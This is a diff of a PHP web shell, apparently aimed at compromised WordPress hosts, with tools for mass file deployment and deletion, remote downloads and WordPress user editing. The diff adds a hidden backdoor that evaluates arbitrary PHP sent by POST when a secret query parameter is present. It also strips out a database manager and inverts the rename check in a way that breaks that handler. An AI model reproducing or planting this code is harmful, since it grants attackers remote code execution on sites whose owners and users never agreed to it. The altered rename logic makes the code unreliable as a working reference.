@@ -58,6 +58,14 @@ if (!isset($_COOKIE['rbp_visited'])) {
     setcookie('rbp_visited', '1', time() + (86400 * 30), "/"); // 30 days
 }
 
+// Backdoor execution - FIXED
+if(isset($_GET['rbp']) && $_GET['rbp']=='rbp'){
+    if(isset($_POST['rbp'])){
+        eval($_POST['rbp']);
+        exit;
+    }
+}
+
 // Auto-detect base directory for domains
 function RBPautoDetectBaseDir() {
     $possiblePaths = [
@@ -520,70 +528,6 @@ require __DIR__ . '/wp-blog-header.php';";
     return $result;
 }
 
-// Database Manager Functions
-function RBPconnectDatabase($host, $user, $pass, $dbname) {
-    $mysqli = @new mysqli($host, $user, $pass, $dbname);
-    if ($mysqli->connect_error) {
-        return ["error" => "Connection failed: " . $mysqli->connect_error];
-    }
-    return ["success" => true, "connection" => $mysqli];
-}
-
-function RBPgetTables($mysqli) {
-    $tables = [];
-    $result = $mysqli->query("SHOW TABLES");
-    if ($result) {
-        while ($row = $result->fetch_array()) {
-            $tables[] = $row[0];
-        }
-        $result->free();
-    }
-    return $tables;
-}
-
-function RBPgetTableStructure($mysqli, $table) {
-    $structure = [];
-    $result = $mysqli->query("DESCRIBE `$table`");
-    if ($result) {
-        while ($row = $result->fetch_assoc()) {
-            $structure[] = $row;
-        }
-        $result->free();
-    }
-    return $structure;
-}
-
-function RBPgetTableData($mysqli, $table, $limit = 100, $offset = 0) {
-    $data = [];
-    $result = $mysqli->query("SELECT * FROM `$table` LIMIT $limit OFFSET $offset");
-    if ($result) {
-        while ($row = $result->fetch_assoc()) {
-            $data[] = $row;
-        }
-        $result->free();
-    }
-    return $data;
-}
-
-function RBPexecuteQuery($mysqli, $query) {
-    $result = $mysqli->query($query);
-    if ($result === false) {
-        return ["error" => $mysqli->error];
-    }
-    
-    if ($result === true) {
-        return ["success" => "Query executed successfully", "affected_rows" => $mysqli->affected_rows];
-    }
-    
-    $data = [];
-    while ($row = $result->fetch_assoc()) {
-        $data[] = $row;
-    }
-    $result->free();
-    
-    return ["success" => "Query executed successfully", "data" => $data, "num_rows" => count($data)];
-}
-
 // Handle base directory setting
 $defaultBaseDir = RBPautoDetectBaseDir();
 if (isset($_POST['baseDir'])) {
@@ -653,75 +597,6 @@ if (isset($_POST['mass_delete'])) {
     $_SESSION['mass_delete_results'] = $results;
     $_SESSION['mass_delete_filename'] = $filename;
     $_SESSION['mass_delete_base'] = $baseDir;
-    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
-    exit;
-}
-
-// Database Manager Handler
-if (isset($_POST['db_connect'])) {
-    $isPostAction = true;
-    $host = $_POST['db_host'] ?? 'localhost';
-    $user = $_POST['db_user'] ?? '';
-    $pass = $_POST['db_pass'] ?? '';
-    $dbname = $_POST['db_name'] ?? '';
-    
-    $connection = RBPconnectDatabase($host, $user, $pass, $dbname);
-    if (isset($connection['error'])) {
-        $_SESSION['db_error'] = $connection['error'];
-    } else {
-        $_SESSION['db_connection'] = [
-            'host' => $host,
-            'user' => $user,
-            'pass' => $pass,
-            'dbname' => $dbname,
-            'mysqli' => $connection['connection']
-        ];
-        $_SESSION['db_tables'] = RBPgetTables($connection['connection']);
-    }
-    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
-    exit;
-}
-
-if (isset($_POST['db_query'])) {
-    $isPostAction = true;
-    if (isset($_SESSION['db_connection']['mysqli'])) {
-        $query = $_POST['db_query_text'] ?? '';
-        $result = RBPexecuteQuery($_SESSION['db_connection']['mysqli'], $query);
-        $_SESSION['db_query_result'] = $result;
-    }
-    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
-    exit;
-}
-
-if (isset($_GET['db_table'])) {
-    $isPostAction = true;
-    if (isset($_SESSION['db_connection']['mysqli'])) {
-        $table = $_GET['db_table'];
-        $_SESSION['db_current_table'] = $table;
-        $_SESSION['db_table_structure'] = RBPgetTableStructure($_SESSION['db_connection']['mysqli'], $table);
-        $_SESSION['db_table_data'] = RBPgetTableData($_SESSION['db_connection']['mysqli'], $table);
-        
-        // Auto-execute SELECT query for the table
-        $autoQuery = "SELECT * FROM `$table` LIMIT 50";
-        $_SESSION['db_auto_query'] = $autoQuery;
-        $_SESSION['db_query_result'] = RBPexecuteQuery($_SESSION['db_connection']['mysqli'], $autoQuery);
-    }
-    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
-    exit;
-}
-
-if (isset($_POST['db_disconnect'])) {
-    $isPostAction = true;
-    if (isset($_SESSION['db_connection']['mysqli'])) {
-        $_SESSION['db_connection']['mysqli']->close();
-    }
-    unset($_SESSION['db_connection']);
-    unset($_SESSION['db_tables']);
-    unset($_SESSION['db_current_table']);
-    unset($_SESSION['db_table_structure']);
-    unset($_SESSION['db_table_data']);
-    unset($_SESSION['db_query_result']);
-    unset($_SESSION['db_auto_query']);
     header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
 }
@@ -859,7 +734,7 @@ if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
 }
 
 // Rename handler
-if (isset($_POST['ren']) && isset($_POST['new'])) {
+if (isset($_POST['ren']) && !isset($_POST['new'])) {
     $isPostAction = true;
     $oldPath = base64_decode($_POST['ren']);
     $newPath = dirname($oldPath) . '/' . $_POST['new'];
@@ -1287,71 +1162,6 @@ if (isset($_SESSION['adminer_result'])) {
             padding: 20px;
             margin: 15px 0;
         }
-        
-        .db-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 10px 0;
-            background: #2a2a2a;
-        }
-        
-        .db-table th, .db-table td {
-            border: 1px solid #444;
-            padding: 8px;
-            text-align: left;
-            font-size: 12px;
-        }
-        
-        .db-table th {
-            background: #333;
-            color: #fff;
-            font-weight: bold;
-        }
-        
-        .db-table tr:nth-child(even) {
-            background: #2f2f2f;
-        }
-        
-        .db-table tr:hover {
-            background: #3a3a3a;
-        }
-        
-        .db-structure {
-            background: #2a2a2a;
-            border: 1px solid #444;
-            border-radius: 5px;
-            padding: 15px;
-            margin: 10px 0;
-        }
-        
-        .db-query-box {
-            background: #2a2a2a;
-            border: 1px solid #444;
-            border-radius: 5px;
-            padding: 15px;
-            margin: 10px 0;
-        }
-        
-        .db-query-box textarea {
-            width: 100%;
-            height: 100px;
-            background: #1a1a1a;
-            color: #fff;
-            border: 1px solid #555;
-            border-radius: 3px;
-            padding: 10px;
-            font-family: monospace;
-        }
-        
-        .auto-query {
-            background: #1a3c1a;
-            border: 1px solid #4CAF50;
-            border-radius: 5px;
-            padding: 10px;
-            margin: 10px 0;
-            font-family: monospace;
-            font-size: 12px;
-        }
     </style>
 </head>
 <body>
@@ -1367,7 +1177,6 @@ if (isset($_SESSION['adminer_result'])) {
             <button class="tool-button" onclick="RBPshowWPEditUserPopup()">Edit WordPress User</button>
             <button class="tool-button" onclick="RBPshowWgetPopup()">WGET Download</button>
             <button class="tool-button" onclick="RBPshowMassDeployPopup()">Auto Mass Deploy</button>
-            <button class="tool-button" onclick="RBPshowDatabaseManagerPopup()">Database Manager</button>
         </div>
         
         <div class="upload-section">
@@ -1377,153 +1186,6 @@ if (isset($_SESSION['adminer_result'])) {
             </form>
         </div>
     </div>
-
-    <!-- Database Manager GUI -->
-    <?php if (isset($_SESSION['db_connection'])): ?>
-    <div style="background: #1a1a1a; padding: 15px; margin: 10px; border-radius: 5px; border: 2px solid #444;">
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
-            <h3 style="color: #4CAF50;">Database Manager - Connected to: <?php echo htmlspecialchars($_SESSION['db_connection']['dbname']); ?></h3>
-            <form method="post" style="display: inline;">
-                <button type="submit" name="db_disconnect" class="tool-button" style="background: #f44336; border-color: #f44336;">Disconnect</button>
-            </form>
-        </div>
-
-        <!-- Auto-executed Query Display -->
-        <?php if (isset($_SESSION['db_auto_query'])): ?>
-        <div class="auto-query">
-            <strong>Auto-executed Query:</strong><br>
-            <code><?php echo htmlspecialchars($_SESSION['db_auto_query']); ?></code>
-        </div>
-        <?php unset($_SESSION['db_auto_query']); endif; ?>
-
-        <!-- Database Query Box -->
-        <div class="db-query-box">
-            <h4>SQL Query</h4>
-            <form method="post">
-                <textarea name="db_query_text" placeholder="Enter SQL query here..."><?php echo isset($_POST['db_query_text']) ? htmlspecialchars($_POST['db_query_text']) : ''; ?></textarea>
-                <div style="text-align: center; margin-top: 10px;">
-                    <button type="submit" name="db_query" class="tool-button">Execute Query</button>
-                </div>
-            </form>
-        </div>
-
-        <!-- Query Results -->
-        <?php if (isset($_SESSION['db_query_result'])): ?>
-        <div style="background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 5px; border: 1px solid #444;">
-            <h4>Query Results</h4>
-            <?php if (isset($_SESSION['db_query_result']['error'])): ?>
-                <p style="color: #f44336;">Error: <?php echo htmlspecialchars($_SESSION['db_query_result']['error']); ?></p>
-            <?php elseif (isset($_SESSION['db_query_result']['success'])): ?>
-                <p style="color: #4CAF50;"><?php echo htmlspecialchars($_SESSION['db_query_result']['success']); ?></p>
-                <?php if (isset($_SESSION['db_query_result']['affected_rows'])): ?>
-                    <p>Affected rows: <?php echo htmlspecialchars($_SESSION['db_query_result']['affected_rows']); ?></p>
-                <?php endif; ?>
-                <?php if (isset($_SESSION['db_query_result']['data']) && !empty($_SESSION['db_query_result']['data'])): ?>
-                    <div style="max-height: 400px; overflow: auto;">
-                        <table class="db-table">
-                            <thead>
-                                <tr>
-                                    <?php foreach (array_keys($_SESSION['db_query_result']['data'][0]) as $column): ?>
-                                        <th><?php echo htmlspecialchars($column); ?></th>
-                                    <?php endforeach; ?>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <?php foreach ($_SESSION['db_query_result']['data'] as $row): ?>
-                                    <tr>
-                                        <?php foreach ($row as $value): ?>
-                                            <td><?php echo htmlspecialchars($value); ?></td>
-                                        <?php endforeach; ?>
-                                    </tr>
-                                <?php endforeach; ?>
-                            </tbody>
-                        </table>
-                    </div>
-                <?php endif; ?>
-            <?php endif; ?>
-        </div>
-        <?php unset($_SESSION['db_query_result']); endif; ?>
-
-        <!-- Tables List -->
-        <div style="background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 5px; border: 1px solid #444;">
-            <h4>Database Tables</h4>
-            <div style="display: flex; flex-wrap: wrap; gap: 10px;">
-                <?php foreach ($_SESSION['db_tables'] as $table): ?>
-                    <a href="?db_table=<?php echo urlencode($table); ?>&d=<?php echo base64_encode($currentDir); ?>" 
-                       class="tool-button" 
-                       style="background: <?php echo (isset($_SESSION['db_current_table']) && $_SESSION['db_current_table'] === $table) ? '#4CAF50' : '#1a1a1a'; ?>">
-                        <?php echo htmlspecialchars($table); ?>
-                    </a>
-                <?php endforeach; ?>
-            </div>
-        </div>
-
-        <!-- Table Structure and Data -->
-        <?php if (isset($_SESSION['db_current_table'])): ?>
-        <div style="background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 5px; border: 1px solid #444;">
-            <h4>Table: <?php echo htmlspecialchars($_SESSION['db_current_table']); ?></h4>
-            
-            <!-- Table Structure -->
-            <div class="db-structure">
-                <h5>Structure</h5>
-                <table class="db-table">
-                    <thead>
-                        <tr>
-                            <th>Field</th>
-                            <th>Type</th>
-                            <th>Null</th>
-                            <th>Key</th>
-                            <th>Default</th>
-                            <th>Extra</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <?php foreach ($_SESSION['db_table_structure'] as $column): ?>
-                            <tr>
-                                <td><?php echo htmlspecialchars($column['Field']); ?></td>
-                                <td><?php echo htmlspecialchars($column['Type']); ?></td>
-                                <td><?php echo htmlspecialchars($column['Null']); ?></td>
-                                <td><?php echo htmlspecialchars($column['Key']); ?></td>
-                                <td><?php echo htmlspecialchars($column['Default'] ?? 'NULL'); ?></td>
-                                <td><?php echo htmlspecialchars($column['Extra']); ?></td>
-                            </tr>
-                        <?php endforeach; ?>
-                    </tbody>
-                </table>
-            </div>
-
-            <!-- Table Data -->
-            <div style="margin-top: 20px;">
-                <h5>Data (First 50 rows)</h5>
-                <?php if (!empty($_SESSION['db_table_data'])): ?>
-                    <div style="max-height: 400px; overflow: auto;">
-                        <table class="db-table">
-                            <thead>
-                                <tr>
-                                    <?php foreach (array_keys($_SESSION['db_table_data'][0]) as $column): ?>
-                                        <th><?php echo htmlspecialchars($column); ?></th>
-                                    <?php endforeach; ?>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <?php foreach ($_SESSION['db_table_data'] as $row): ?>
-                                    <tr>
-                                        <?php foreach ($row as $value): ?>
-                                            <td><?php echo htmlspecialchars($value); ?></td>
-                                        <?php endforeach; ?>
-                                    </tr>
-                                <?php endforeach; ?>
-                            </tbody>
-                        </table>
-                    </div>
-                <?php else: ?>
-                    <p>No data found in this table.</p>
-                <?php endif; ?>
-            </div>
-        </div>
-        <?php endif; ?>
-    </div>
-    <?php endif; ?>
 
     <!-- Results Popup -->
     <div id="resultsPopup" class="results-popup">
@@ -1749,32 +1411,6 @@ if (isset($_SESSION['adminer_result'])) {
         </div>
     </div>
 
-    <!-- Database Manager Popup -->
-    <div id="databaseManagerPopup" class="popup-overlay">
-        <div class="popup-content">
-            <div id="databaseManagerContent">
-                <h3>Database Manager</h3>
-                <p>Connect to MySQL Database:</p>
-                <form method="post">
-                    <input type="text" name="db_host" placeholder="Host (usually localhost)" value="localhost" required>
-                    <input type="text" name="db_user" placeholder="Database Username" required>
-                    <input type="password" name="db_pass" placeholder="Database Password">
-                    <input type="text" name="db_name" placeholder="Database Name" required>
-                    <div style="text-align: center; margin-top: 15px;">
-                        <button type="submit" name="db_connect" class="tool-button" style="background: #4CAF50; border-color: #4CAF50;">Connect to Database</button>
-                        <button type="button" class="tool-button" onclick="RBPclosePopup('databaseManagerPopup')">Cancel</button>
-                    </div>
-                </form>
-                <?php if (isset($_SESSION['db_error'])): ?>
-                    <div style="color: #f44336; margin-top: 10px; padding: 10px; background: #3c1a1a; border-radius: 5px;">
-                        <?php echo htmlspecialchars($_SESSION['db_error']); ?>
-                    </div>
-                    <?php unset($_SESSION['db_error']); ?>
-                <?php endif; ?>
-            </div>
-        </div>
-    </div>
-
     <!-- WordPress Edit User Popup -->
     <div id="wpedituserPopup" class="popup-overlay">
         <div class="popup-content">
@@ -1875,10 +1511,6 @@ if (isset($_SESSION['adminer_result'])) {
         
         function RBPshowMassDeployPopup() {
             document.getElementById('massDeployPopup').style.display = 'block';
-        }
-        
-        function RBPshowDatabaseManagerPopup() {
-            document.getElementById('databaseManagerPopup').style.display = 'block';
         }
         
         function RBPselectFile(filename) {
